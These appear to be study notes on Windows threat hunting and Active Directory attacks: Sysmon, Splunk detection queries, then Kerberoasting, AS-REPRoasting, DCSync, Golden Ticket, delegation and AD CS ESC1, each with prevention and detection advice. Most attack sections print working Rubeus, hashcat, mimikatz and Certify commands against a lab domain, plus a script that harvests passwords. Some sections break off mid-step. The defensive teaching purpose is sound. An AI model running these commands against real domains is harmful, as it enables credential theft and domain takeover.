Introduction to Sysmon

Sysmon (System Monitor) is a Windows tool that logs system activity in detail using three main components:
Windows Service: Monitors system actions.
Kernel driver: captures data.
Event Log: Displays detected activities.
Common Sysmon events:
ID 1: Process creation
ID 3: Network connection

Configuration is done via an XML file allowing events to be included or excluded according to specific criteria (process name, IP, etc.).

Recommended configurations:
SwiftOnSecurity Sysmon Config
Olaf Hartong Modular Config
Installation (administrator rights required):

C:\Tools\Sysmon> sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n
Apply a custom configuration:

C:\Tools\Sysmon> sysmon.exe -c file.xml

Introduction to Threat Hunting & Hunting With Elastic 
What is Cyber ​​Threat Intelligence (CTI)?

CTI (Cyber ​​Threat Intelligence) refers to all the information analyzed on cyber threats making it possible to anticipate, detect, understand and respond to attacks. Its objective is to move from a reactive defensive posture to a proactive posture.

The 4 pillars of effective CTI:
Relevance: The information must concern the environment or the company's partners.
Temporality: Information must be transmitted quickly – it loses value over time.
Actionability: It must be able to be used immediately to strengthen the defense.
Accuracy: The information must be verified. Otherwise, a confidence level is indicated.

🆚 CTI vs. Threat Hunting:

| CTI (Predictive) | Threat Hunting (Proactive & Reactive) |
| ------------------------------------------------------- | ------------------------------------------------ |
| Anticipate the opponent (where, when, how, why?) | Search for adversary presence in the network |
| Used to predict attacks | Used to detect existing or past threats |
| Sharing information with hunters | Uses CTI to guide research |

Usefulness of the CTI:
Understanding the threats targeting the organization.
Support for strategic decision-making (risk reduction).
Implementation of action plans in the event of a crisis.

The 3 levels of Cyber Threat Intelligence:
Strategic
For leaders (C-suite, VPs)
Answers the “Who?” and “Why?”
Ex: reports on APT28, motivations, targets, history
Operational
For middle managers
Answers to “How?” and “Where?”
Ex: detailed tactics of a group like REvil
Tactical
For network analysts and defenders
Provides IOCs: IPs, domains, hashes, etc.
Used in detection tools (SIEM, EDR, IDS/IPS)

Read a Tactical CTI Report – Key Steps:
Understand the context of the report (targeted sector, objective).
Identify and classify IOCs (network, host, email, etc.).
Understand the attack lifecycle (often mapped to MITER ATT\&CK).
Check IOCs (via VirusTotal, OTX, etc.) to avoid false positives.
Implement IOCs in the infrastructure (SIEM, firewall, EDR, etc.).
Actively hunt threats (Threat Hunting based on IOCs and TTPs).
Continuously monitor and learn, while sharing new information.

Detecting Attacker Behavior With Splunk Based On TTPs 
Detecting Tactics, Techniques and Procedures (TTPs) in Splunk

In cybersecurity, identifying attackers' TTPs is essential to effectively detect threats. This involves spotting known malicious behavior or unusual anomalies.
Two complementary approaches:
Known TTPs: Use documented attack behaviors to create precise detection rules.
Anomaly detection: spot unusual patterns through statistical analysis, without prior knowledge of the attack.

The right balance between these two methods allows for broad and effective coverage. Regular adjustments to queries and thresholds are necessary to refine results and limit false positives.

Examples of SPL Searches Based on Known TTPs
Recognition via native Windows binaries

Tools like ipconfig.exe, net.exe, or whoami.exe are often used by attackers for initial exploration.

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 Image=\ipconfig.exe OR Image=\net.exe OR Image=\whoami.exe OR Image=\netstat.exe OR Image=\nbtstat.exe OR Image=\hostname.exe OR Image=\tasklist.exe
| stats count by Image, CommandLine
| sort - count

Malicious downloading from reputable domains (ex: GitHub)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=22 QueryName="github"
| stats count by Image, QueryName

Suspicious use of PsExec

Case 1 – Writing to the registry:

index="main" sourcetype="WinEventLog:Sysmon" EventCode=13 Image="C:\Windows\system32\services.exe" TargetObject="HKLM\System\CurrentControlSet\Services\\ImagePath"
| rex field=Details "(?<regfilename>[^\\]+)$"
| eval filename = if(isnull(filename),regfilename,lower(filename))
| stats values(Image) AS Image, values(Details) AS RegistryDetails, values(time) AS EventTimes, count by file_name, ComputerName

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image=System

Detecting Attacker Behavior With Splunk Based On Analytics 
Anomaly Detection in Splunk: Identify Unusual Behavior

In the field of cybersecurity, anomaly-based detection is essential to identify suspicious behaviors that escape traditional methods based on TTPs (Tactics, Techniques, and Procedures). By profiling the normal activity of a system, Splunk uses statistical commands like streamstats to identify significant deviations that could indicate a compromise.

Example 1: Detecting abnormal network connections with streamstats

This query monitors the frequency of network connections per process. It flags those who exceed a statistical threshold based on their historical behavior.

index="main" sourcetype="WinEventLog:Sysmon" EventCode=3
| bin time span=1h
| stats count as NetworkConnections by time, Image
| streamstats timewindow=24h avg(NetworkConnections) as avg stdev(NetworkConnections) as stdev by Image
| eval isOutlier=if(NetworkConnections > (avg + 0.5 stdev), 1, 0)
| search isOutlier=1

Explanation:
streamstats calculates the rolling average and standard deviation over 24 hours.
A process is flagged if it exceeds the mean by more than 0.5 standard deviations.

Example 2: Detection of abnormally long commands

Very long command lines may indicate attempts at evasion or obfuscation.

index="main" sourcetype="WinEventLog:Sysmon" Image=cmd.exe
| eval len=len(CommandLine)
| User table, len, CommandLine
| sort - len

To refine the results, we can exclude benign parent processes:

index="main" sourcetype="WinEventLog:Sysmon" Image=cmd.exe 
ParentImage!="msiexec.exe" ParentImage!="explorer.exe"
| eval len=len(CommandLine)
| User table, len, CommandLine
| sort - len

Example 3: Unusual cmd.exe activity by user

This case detects a sudden increase in cmd.exe usage for a given user.

index="main" EventCode=1 (CommandLine="cmd.exe")
| bucket time span=1h
| stats count as cmdCount by time User CommandLine
| eventstats avg(cmdCount) as avg stdev(cmdCount) as stdev
| eval isOutlier=if(cmdCount > avg + 1.5 stdev, 1, 0)
| search isOutlier=1

Example 4: Fast loading of many DLLs

Malicious activity can load multiple DLLs in a short time. This query identifies the processes involved:

index="main" EventCode=7 
NOT (Image="C:\Windows\System32") NOT (Image="C:\Program Files")
| bucket time span=1h
| stats dc(ImageLoaded) as uniquedllsloaded by time, Image
| where uniquedllsloaded > 3
| stats count by Image, uniquedllsloaded
| sort - uniquedlls_loaded

Example 5: Multiple executions of the same process on a host

Repeated executions may indicate suspicious activity:

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
| transaction ComputerName, Image
| where mvcount(ProcessGuid) > 1
| stats count by Image, ParentImage

To target special cases, such as rundll32.exe executed by svchost.exe:

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
| transaction ComputerName, Image
| where mvcount(ProcessGuid) > 1
| search Image="C:\Windows\System32\rundll32.exe" ParentImage="C:\Windows\System32\svchost.exe"
| table CommandLine, ParentCommandLine

Kerberoasting in Active Directory – Explanation, Attack, Prevention and Detection
What is an SPN?

A Service Principal Name (SPN) is a unique identifier used by Kerberos to authenticate a service without needing to know the service account name. When a Ticket Granting Service (TGS) ticket is requested, it is encrypted with the NTLM hash of the service account.

Kerberoasting: Principle of the attack

Kerberoasting is a post-exploitation technique. It consists of:
Retrieve service TGS tickets (associated with SPNs).
Crack them offline to find the service account password.

The attack is all the more effective if:
The account password is weak.
The ticket uses a vulnerable encryption algorithm.
Encryption algorithms used:
AES: very secure, difficult to crack.
RC4: Frequently vulnerable.
DES: obsolete, rarely used today.

Despite security recommendations, RC4 and DES are still present in some environments.

Attack path
Extraction of TGS tickets

With tools like Rubeus, an attacker can extract Kerberos tickets linked to SPN accounts:

PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt
Tickets are saved in spn.txt.
Ticket cracking

The extracted hashes are then transferred to a tool like Hashcat (Linux/Kali) for brute force attempt:

hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
-m 13100: Hashcat mode for Kerberoasting.
passwords.txt: password dictionary.
Result: Service account passwords are revealed in clear text.

cat cracked.txt
Prevention

To counter this attack:
Strong passwords: long and complex (ideally > 100 characters).
Limit SPN accounts: Delete unused SPNs.
Use GMSA (Group Managed Service Accounts): passwords managed and automatically renewed.

Detection

Each TGS request generates a Windows event ID 4769. Although it is difficult to monitor everything, some behavior is suspicious:
RC4 tickets: if the environment is supposed to use AES only, alert on any RC4 tickets.
Abnormal volume of TGS requests: especially from a single station or user.
Honeypot accounts: create a fake account with an SPN, inactive but attractive. Any query to this account is suspicious.

Creating a honeypot account

Criteria for an effective decoy account:
Old account: inactive for > 2 years.
Unbreakable password.
Realistic SPN: linked to a service like IIS or SQL.

Example:

Account name: svc-iam
Assigned SPN: HTTP/svc-iam.domain.local
Important note

Multiplying honeypots can make their presence detectable. It is therefore crucial to adapt these techniques to your environment, combining security and discretion.
AS-REProasting 
AS-REPRoasting in Active Directory – Description, Attack, Prevention and Detection
What is AS-REPRoasting?

The AS-REPRoasting attack is similar to Kerberoasting. It targets user accounts configured without Kerberos pre-authentication ("Do not require Kerberos preauthentication" option). This configuration allows attackers to recover crackable Kerberos hashes without interacting with the account password.

The success of the attack mainly depends on the strength of the password of the targeted account.

Stages of attack
Extraction of AS-REP hashes

Using tools like Rubeus, attackers extract hashes from vulnerable accounts:

PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt
The hashes are saved in the asrep.txt file.
Preparing hash for cracking

Before bruteforcing, the hash must be formatted for Hashcat. You must ensure that the hash begins with:

$krb5asrep$23$...
Example:

$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c6480335...
Cracking with Hashcat

Using Hashcat in 18200 mode, specially designed for AS-REP hashes:

sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
Displaying results

Once the password is found, open it in plain text:

cat asrepcrack.txt
Prevention

Security is mainly based on account configuration and password policy.
Regular review: Disable the “no preauthentication” option unless strictly necessary. Conduct quarterly audits to detect any misconfigurations.
Strengthened password policy: Impose a minimum length of 20 characters for accounts without pre-authentication.

Detection

When a TGT is requested, Windows event ID 4768 is generated. Although common, it is possible to detect suspicious behavior by:
Correlating IP/VLANs: Identify unusual sources of queries.
Behavioral analysis: Monitor frequent requests to the same account or from unknown addresses.

Deploying a honeypot account

A well-configured honeypot account can attract and identify AS-REPRoasting attacks. It must meet certain criteria:
Old account: Inactive for a long time, with a password never changed.
Recent Login: Must appear active to appear legitimate.
Assigned Privileges: Enough rights to attract the attention of attackers.
Pre-authentication disabled: Necessary condition for the attack.

Example:

Account name: svc-iam  
Configuration: elevated privileges, Kerberos pre-authentication disabled
Cautionary advice

Avoid overusing honeypots, as this risks creating patterns that attackers can detect. Select the detection methods best suited to your environment to balance efficiency and discretion.

GPO Permissions/GPO Files 
GPO Abuse in Active Directory – Description, Attack, Prevention and Detection
What is a GPO?

A Group Policy Object (GPO) is a set of configurations applied to Active Directory objects (users, computers) via Organization Units (OU). Each GPO has a unique name and can be filtered by:
Security groups (e.g.: Domain Users),
WMI filters,
OR specific.
By default, only Domain Admins and privileged roles can modify a GPO. But specific delegations can extend these rights to less privileged users.

GPO attack vectors

An attacker with access to a compromised account with editing rights to a GPO can:
Add startup scripts, scheduled tasks or malware.
Target objects in the OU linked to the GPO, thereby compromising multiple machines.

Another common vector is the exploitation of poorly configured network shares containing files used by GPOs (e.g. scripts or executables). If NTFS permissions allow writing, the attacker can replace a legitimate file with a malicious file, even if the GPO is intact.

Using GPO permissions
Direct attack:
Modify a vulnerable GPO (permissions too broad).
Add a malicious script or executable.
Indirect attack:
Identify a GPO using a file on an editable share.
Replace this file with a malicious version.

Prevention

 Strictly restrict GPO permissions:
Limit editing rights to a list of trusted accounts.

 Regular review of GPOs:
Implement an automated hourly check of GPO permissions.
Detect any deviations from planned configurations.

 Secure network shares:
Never use GPO files hosted on shares that are writable to multiple users.

Detection
Editing a GPO

Enable directory change auditing to capture the following event:
Event ID 5136: Reports an object change, including GPO.
Any modification made by an unauthorized user must generate an immediate alert.

Honeypot GPO

An advanced detection strategy is to create a decoy GPO configured to attract an attacker.
Conditions for an effective GPO honeypot:
Linked to non-critical servers.
Automated, real-time tracking of changes.
Automatic deactivation if tampering is detected.
Autodetect script (PowerShell)

This PowerShell script monitors a specific honeypot GPO and disables any user who modified it:

Monitoring period: 15 minutes

Credentials in Shares 
Credential Exposure in Network Shares – Description, Attack, Prevention and Detection
Context: Exposure of Identifiers on Network Shares

Exposing credentials in network shares is one of the most common misconfigurations encountered in Active Directory. Although these errors frequently occur in large companies, they can also affect small structures. This phenomenon resembles an evolution of the problem of passwords left on post-its, moving to “don't leave unencrypted credentials and authorization tokens scattered around the network”.

Identifiers can be found in scripts and configuration files on network shares (e.g. batch scripts, cmd, PowerShell, ini and config files). In contrast, credentials stored on users' local machines are often found in text, Excel, or Word files. However, the major difference is that network shares pose a much higher risk due to their potential accessibility to all users.
Why Are Network Shares Exposed?

There are several reasons why a network share becomes accessible to everyone:
Too broad access to initially secure sharing:
   An administrator creates a share with appropriate restrictions, but other administrators end up expanding access to "Everyone" ("Users" group), giving access to all users in the domain.
Poor management of script sharing:
   Sometimes an administrator creates a directory to test scripts on \C:\ or another shared directory, but forgets to restrict access, exposing sensitive information.
Shares opened by negligence:
   Some shares may be left open after temporary use to transfer files or install software, and then are not closed after use.
Misunderstood hidden shares:
   Hidden shares (folder name ending in "\$") are not displayed in Windows Explorer. However, other tools (like PowerShell or Command Prompt) can access it and find sensitive information.
Attack

The attack begins by identifying accessible network shares within the domain. Tools like PowerView's Invoke-ShareFinder allow you to list all available shares and check access based on user permissions.

Example of using PowerView:

PS C:\Users\bob\Downloads> Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
Example output:

\\DC2.eagle.local\NETLOGON - Logon server share
\\DC2.eagle.local\SYSVOL - Logon server share
\\WS001.eagle.local\Share -
\\WS001.eagle.local\Users -
\\Server01.eagle.local\dev$ -
The attacker can then search for keywords like "pass", "username", or "password" in shared files using the findstr command (integrated tool in Windows):

PowerShell command:

PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.bat
Prevention

The best way to prevent this attack is to lock down access to all network shares in the domain. It is essential to perform regular (weekly) scans to detect any new open shares or sensitive information exposed in an old share.
Limit permissions on shares: Restrict access to only necessary users.
Regular audits: Schedule frequent scans of network shares to check their security.
Use of secure shares: Avoid using shares that can be modified by unauthorized users.
Detection

Detecting exploitation of credentials exposed on shares is based on analyzing user behavior and monitoring events associated with the use of compromised credentials.

Key events to watch:
Event ID 4624: Connection successful (connection with exposed credentials).
Event ID 4768: TGT (Kerberos) ticket request.

Analyzing suspicious connections or those coming from unusual locations can help identify credential exploitation.
Honeypot

An effective strategy for detecting credential exploitation on shares is to create a honeypot account in Active Directory.

Ideal configuration for a honeypot account:
A service account created more than 2 years ago, with a password that has not been changed for at least a year.
This account must still be active in the environment, but misconfiguring its password will mostly result in failed login attempts.

Events associated with a honeypot account:
4625: Connection attempt failed.
4771: Kerberos authentication failed.
4776: NTLM authentication failed.

Tracking these attempts can alert administrators if credentials have been compromised.
Credentials in Object Properties 
Exposure of Identifiers in Active Directory Object Properties – Description, Attack, Prevention and Detection
Context: Storing Credentials in Object Properties in Active Directory

In Active Directory, each object has many properties, such as:
Account status (active/inactive),
The expiration date of the account,
The date of the last modification of the password,
The name of the account,
The employee’s location, telephone number, etc.

Administrators populate these properties when creating accounts. However, a common bad practice in the past was to add passwords (or other sensitive information) to the Description or Info properties of objects. This approach was often motivated by the mistaken belief that these properties were secure and reserved for viewing only by administrators. However, it is important to know that all users in the domain can read the majority of object properties, including Description and Info.
Attack

An attacker can easily retrieve passwords stored in these properties by using a simple PowerShell script that queries the domain for specific terms in the Users' Description or Info properties.

Example PowerShell script:

Function SearchUserClearTextInformation {
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms) {
        $list += "(Description -like \"*$t*\")"
        $list += "(Info -like \"*$t*\")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
In this example, the script searches for the keyword "pass" in the Description and Info properties to find plaintext passwords. If a password is found in a field, the script returns the user information.

Example of script execution:

PS C:\Users\bob\Downloads> SearchUserClearTextInformation -Terms "pass"
SamAccountName: bonni
Enabled: True
Description: pass: Slavi123
Info: 
PasswordNeverExpires: True
PasswordLastSet: 05/12/2022 15.18.05
Here the password Slavi123 is found in the Description field of user bonni.
Prevention

To prevent this type of misconfiguration, here are some best practices:
Continuous assessments: Perform ongoing assessments to detect the presence of passwords in Active Directory object properties.
Elevated Employee Training: Train administrators and privileged users to avoid storing credentials in these properties.
Automate the creation of user accounts: Automate the creation of user accounts as much as possible to avoid administrators manually entering sensitive information, such as passwords, in object properties.
Detection

Detection of the exploitation of sensitive information in object properties can be carried out through the analysis of user behavior. This detection method is most effective for administrative accounts or service accounts, whose behavior can be understood and monitored.

Events to watch for include:
Event ID 4624: Connection successful, which may indicate that the identifiers found in the object properties were used.
Event ID 4625: Connection attempt failed, if the attacker tries to use credentials stored in clear text but fails.
Event ID 4768: Kerberos TGT request, related to the use of identifiers in the Kerberos environment.

Detection limitation: The event Event ID 4738 (modification of a user object) does not directly identify which properties have been modified or the new property values. This makes it difficult for administrators to detect password additions in these fields.
Honeypot

Storing passwords in object properties can be an interesting technique for creating a honeypot in an Active Directory environment that has not yet reached a level of maturity in terms of credential management.

Honeypot account configuration:
The password is stored in the Description field, making it easier for an attacker to discover.
The password provided is incorrect (this helps detect failed login attempts).
The account is activated and has recent login attempts.
Ideally, use a service account, as administrators tend to create them manually, unlike user accounts created by automated systems (like the HR system).
The password for this account was set more than 2 years ago, which makes it credible in the eyes of an attacker.

Due to the incorrect password, you can expect to see failed login attempts, such as:
Event ID 4625: Connection failed.
Event ID 4771: Kerberos authentication failed.
Event ID 4776: Failed to validate NTLM credentials.
DCSync 
DCSync Attack in Active Directory
Description

The DCSync attack allows attackers to impersonate a Domain Controller (DC) and perform replication with a targeted Domain Controller to extract password hashes from Active Directory (AD). This attack requires specific permissions, which are:
Replicating Directory Changes
Replicating Directory Changes All

These permissions enable the attacker to request password data from the AD environment, mimicking the behavior of a Domain Controller during replication.

The attack can be initiated by either a user or a computer, as long as the attacker has the necessary replication permissions assigned. This makes it a potent attack method for obtaining credential hashes from the AD environment, even without direct access to the domain controller itself.
Attack Process

Here is an example of how the DCSync attack works using Mimikatz, a popular tool for Windows post-exploitation:
Step 1: Set Up the Attacker User Account

First, the attacker needs to impersonate a user that has the Replicating Directory Changes and Replicating Directory Changes All permissions.
In this example, the user Rocky has the required permissions.
Rocky’s password is Slavi123.
Step 2: Start a Command Shell as the Attacker User

The attacker uses the runas command to launch a command shell as the user Rocky:

C:\Users\bob\Downloads> runas /user:eagle\rocky cmd.exe
Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky"
Step 3: Use Mimikatz to Perform DCSync

Once in the command shell, the attacker uses Mimikatz to dump password hashes. The attacker targets the Administrator account in this case:

C:\Mimikatz> mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
This command initiates the DCSync attack against the Administrator user in the eagle.local domain.

Mimikatz Output Example:

[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service: ldap
[rpc] AuthnSvc: GSSNEGOTIATE (9)

RDN Object: Administrator

 SAM ACCOUNT 

SAM Username: Administrator
Account Type: 30000000 (USEROBJECT)
User Account Control: 00010200 (NORMALACCOUNT DONTEXPIRE_PASSWD)
Account expiration:
Password last change: 07/08/2022 11.24.13
Object Security ID: S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID: 500

Credentials:
  NTLM Hash: fcdc65703dd2b0bd789977f1f3eeaecf
In this example, the NTLM hash for the Administrator account is extracted. The hash is then used for potential further attacks, like pass-the-hash.
Optional: Dump All Hashes in AD

Alternatively, the attacker can use the /all parameter to dump the hashes of all user accounts in the Active Directory environment:

mimikatz # lsadump::dcsync /domain:eagle.local /all
This command would dump the NTLM hashes of every user in the domain, providing a broader attack surface for the attacker.
Prevention

Complete prevention of DCSync is challenging because the attack mimics standard replication operations within Active Directory. However, several mitigation measures can reduce the risk:
Limit Replication Permissions:
Restrict Replicating Directory Changes and Replicating Directory Changes All permissions to only trusted and necessary Domain Controllers.
Remove unnecessary accounts from these permissions, especially non-administrative or low-privileged accounts.
Use an RPC Firewall:
Implement an RPC Firewall to restrict replication requests to only trusted Domain Controllers. This can help block unauthorized replication attempts from non-DC systems.
Use Managed Service Accounts (MSAs):
Use Managed Service Accounts (MSAs) instead of regular service accounts. MSAs reduce the need for manually managing credentials, which lowers the likelihood of exposing replication permissions to non-DC systems.
Use Strong Authentication:
Implement strong authentication mechanisms such as multi-factor authentication (MFA) for accounts that have replication privileges.
Detection

Detecting DCSync is possible by monitoring for specific events that are generated during the replication process. The following are important steps for detection:
Monitor Event ID 4662:
This event is generated whenever a replication attempt is made on a Domain Controller.
The event logs will contain information about the account initiating the replication and the object being replicated.
Look for Replication Attempts:
When an attacker uses DCSync, Event ID 4662 will log details of the replication attempt.
Be on the lookout for unexpected replication requests from non-DC systems.
Whitelist Trusted Systems:
To reduce false positives, configure event monitoring systems to whitelist systems that legitimately need replication, such as Azure AD Connect or trusted Domain Controllers.

Example of Event ID 4662 (Unauthorized DCSync Attempt):

Event ID: 4662
Account Name: rocky
Object Name: DC2.eagle.local
Object Type: user
Access Mask: Replicate Directory Changes All
This event may indicate a DCSync attempt, particularly if the account initiating the replication is not authorized to perform this action.
Conclusion

The DCSync attack is a highly effective method for attackers to extract password hashes from Active Directory by impersonating a Domain Controller and performing replication. The attack relies on having the necessary replication permissions assigned to the attacker’s account, which may be inadvertently granted due to misconfigurations.
Golden Ticket 
Kerberos Golden Ticket Attack
Description

The Kerberos Golden Ticket is a highly impactful attack that allows attackers to create or forge valid Kerberos tickets (TGTs) for any user in the domain. By exploiting the krbtgt account (which is responsible for signing all Kerberos tickets in Active Directory), attackers can forge these tickets and impersonate any user, including privileged accounts like Domain Admins.

In a Kerberos authentication setup, the krbtgt account is critical because its password hash is used by the Key Distribution Center (KDC) to sign all Kerberos tickets. An attacker with access to the hash of this password can create valid Kerberos TGTs, enabling the attacker to authenticate as any user in the domain, including those with domain-wide privileges.

The Golden Ticket attack is typically performed after the attacker has gained Domain Admin or equivalent privileges, allowing them to generate a persistent, high-level foothold in the domain.
Attack Overview
Targeting the krbtgt Account:
The krbtgt account is automatically created when a domain is set up. Its password is used by the KDC to sign Kerberos tickets.
This account is disabled by default, but it cannot be deleted, renamed, or enabled.
Possession of the krbtgt password hash enables an attacker to generate legitimate Kerberos TGTs.
Escalating Privileges:
With the Golden Ticket, an attacker can impersonate any user in the domain, including users from other domains in the forest.
The attacker can escalate privileges from a child domain to a parent domain, giving them access to the entire forest.
Persistent Access:
The Golden Ticket provides long-term persistence in the domain, allowing the attacker to maintain access even after their original compromise is detected and remediated.
Steps to Perform the Golden Ticket Attack

Step 1: Obtain the krbtgt Hash and SID

The first step is to obtain the krbtgt password hash and the domain SID. This can be achieved using tools like Mimikatz and DCSync.
Use DCSync to dump the krbtgt hash and domain SID:

mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
Mimikatz Output Example:

SAM Username: krbtgt
NTLM Hash: db0d0630064747072a7da3f7c3b4069e
SID: S-1-5-21-1518138621-4282902758-752445584
The krbtgt hash (in this example: db0d0630064747072a7da3f7c3b4069e) is required for the Golden Ticket, as is the domain SID (S-1-5-21-1518138621-4282902758-752445584).

Step 2: Generate the Golden Ticket

Once the krbtgt hash and domain SID are obtained, the attacker can use Mimikatz to create a forged Kerberos Ticket Granting Ticket (TGT). The kerberos::golden command is used to generate the ticket.

Example command:

mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
Where:
/domain: Specifies the domain name (e.g., eagle.local).
/sid: Specifies the domain SID obtained from the previous step.
/rc4: The NTLM hash of the krbtgt account.
/user: The username for which the Golden Ticket is being created (e.g., Administrator).
/id: The Relative ID (RID) of the user (e.g., 500 for Administrator).
/renewmax: The maximum number of days the ticket can be renewed (e.g., 7).
/endin: The expiration date/time for the ticket (e.g., 8 for 8 days).
/ptt: Places the forged ticket into the current ticket cache (useful for immediate use).

Step 3: Verify the Golden Ticket

Once the ticket is created, it can be verified using the klist command to see if the Golden Ticket has been properly added to the Kerberos ticket cache:

C:\Mimikatz> klist
If the Golden Ticket was successfully created, you should see the forged TGT listed in the output.
Prevention

Preventing the Golden Ticket attack is difficult because it leverages the inherent trust in Kerberos tickets. However, the following steps can mitigate the attack:
Block Privileged Users from Authenticating to Non-Essential Devices:
Restrict privileged users from authenticating to any device that does not require their credentials, reducing the chances of their credentials being used for Golden Ticket generation.
Periodically Reset the krbtgt Password:
Regularly changing the krbtgt account password can limit the window of opportunity for attackers to exploit a compromised hash.
It is recommended to reset the krbtgt password twice, with at least 10 hours between resets, to clear any old hashes.
Enforce SIDHistory Filtering:
Enabling SIDHistory filtering can prevent attackers from using SIDHistory attributes for cross-domain escalation (i.e., moving from a child domain to a parent domain).
Implement Monitoring and Alerting for Unusual Authentication Activity:
Monitor for suspicious Kerberos activity such as multiple requests for TGTs without prior TGS (Ticket Granting Service) requests, which may indicate a Golden Ticket.
Detection
Monitor Event ID 4624 and 4625 for Suspicious Logons:
These event IDs capture both successful and failed logon attempts. Monitor for logins from unusual or unexpected accounts, especially Administrator and other high-privileged accounts.
Look for TGS Requests Without a Prior TGT:
TGS requests that occur without a valid TGT may indicate the presence of a Golden Ticket.
Monitor for Event ID 4675 if SIDHistory Filtering is Enabled:
This event indicates cross-domain escalation, which can be caused by a Golden Ticket being used to impersonate an account from another domain.
Check for Golden Ticket Usage:
Look for evidence of forged TGTs in the Kerberos ticket cache using tools like klist.
Kerberos Constrained Delegation 
Description

Kerberos Delegation allows an application to access resources on another server on behalf of a user, without that user having direct access. For example, a service account for a web server can be delegated to access an SQL database, which allows users to interact with the data without having direct rights to the database.
Types of Kerberos delegation in Active Directory:
Unconstrained Delegation
The most permissive. Allows the delegated account to access any service.
Constrained Delegation
Limits the services the account can delegate to, defined in the user attributes.
Resource-Based Constrained Delegation
Less used, it is configured at the level of the target machine object.
All forms of delegation represent a potential security risk. They should be avoided unless absolutely necessary.

Attack: Abuse of Constrained Delegation

When an account is configured for restricted delegation, it can request Kerberos tickets for other accounts to access specific services.
Attack steps:
Identify the accounts configured for delegation:

Get-NetUser-TrustedToAuth
Example result:

distinguishedname: CN=web service,CN=Users,DC=eagle,DC=local
msds-allowedtodelegateto: {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local}
useraccountcontrol: TRUSTEDTOAUTHFORDELEGATION
Recover the NTLM hash of the compromised password (ex: Slavi123):

.\Rubeus.exe hash /password:Slavi123
Output:

Impersonate the user ‘Administrator’ and inject the Kerberos ticket:

klist

Enable the “Account is sensitive and cannot be delegated” option for privileged accounts.
Add critical accounts to the "Protected Users" group, which prevents any form of delegation.
Implement a robust password policy to avoid Kerberoasting attacks.

Detection
Monitor suspicious logins using Event ID 4624 (logon successful).
Inspect the Transited Services field in the logs to identify S4U (Service for User) type logon processes.
Print Spooler & NTLM Relaying 
Print Spooler Exploitation (PrinterBug)
Description

The Print Spooler service, enabled by default even in modern Windows systems, became a critical attack vector after the discovery of "PrinterBug" by Lee Christensen in 2018.

This bug leverages the functions RpcRemoteFindFirstPrinterChangeNotification and RpcRemoteFindFirstPrinterChangeNotificationEx to force a remote machine to authenticate to an attacker-controlled system, sending Kerberos TGTs that can be relayed or harvested.
Microsoft classified this issue as “by-design” and did not release a patch.

Impact

If a Domain Controller (DC) runs the Print Spooler service, an attacker can:
Relay the DC’s connection to another DC to perform DCSync, assuming SMB signing is disabled.
Force the DC to connect to a server with Unconstrained Delegation, allowing TGTs to be cached and extracted with tools like Mimikatz or Rubeus.
Relay authentication to Active Directory Certificate Services (AD CS) to obtain a valid certificate impersonating the DC.
Abuse the connection to configure Resource-Based Delegation, enabling further privilege escalation.

Attack Methodology

This example demonstrates NTLM relay to perform DCSync by redirecting the DC’s Print Spooler request to another DC.
Step-by-Step:
Start NTLMRelayx, targeting the second DC (DC2):

Description

Coercion attacks are a class of privilege escalation techniques in Active Directory where an attacker forces one system (usually a privileged one like a Domain Controller) to authenticate to an attacker-controlled machine. This allows credential theft or ticket manipulation.

Relay to another DC and perform DCSync, if SMB signing is disabled.

ESC1 Attack – Abuse of Active Directory Certificate Services (AD CS)
Description

Certified Pre-Owned research by SpecterOps highlighted Active Directory Certificate Services (AD CS) as a preferred attack vector due to many common misconfigurations. Certificates offer a strong advantage to attackers:
Long-term validity (often a year or more).
Password resets do not invalidate already issued certificates.
Misconfigured templates allow attackers to obtain certificates on behalf of other users.
The compromise of the private key of a certification authority makes it possible to forge “Golden Certificates”.

One of the most notorious methods of privilege escalation is ESC1, which relies on the following characteristics:
No approval or manual validation required.
The model allows for Client Authentication or smart card login.
The CTFLAGENROLLEESUPPLIESSUBJECT flag is enabled, allowing the user to provide the subject name (SAN) themselves.

Executing the ESC1 attack
Scan for vulnerable models with Certify:

.\Certify.exe find /vulnerable
Example result:
The UserCert model is vulnerable because:
Accessible to all domain users.
Allows the definition of the Subject Alternative Name (SAN) (therefore the usurpation of other identities).
Does not require manager approval.
Allows client authentication (logon).
Request a certificate by impersonating Administrator:

.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
This generates a certificate in PEM format.
Convert the certificate to PFX format (Rubeus compatible):

sed -i 's/\s\s\+/\n/g' cert.pem
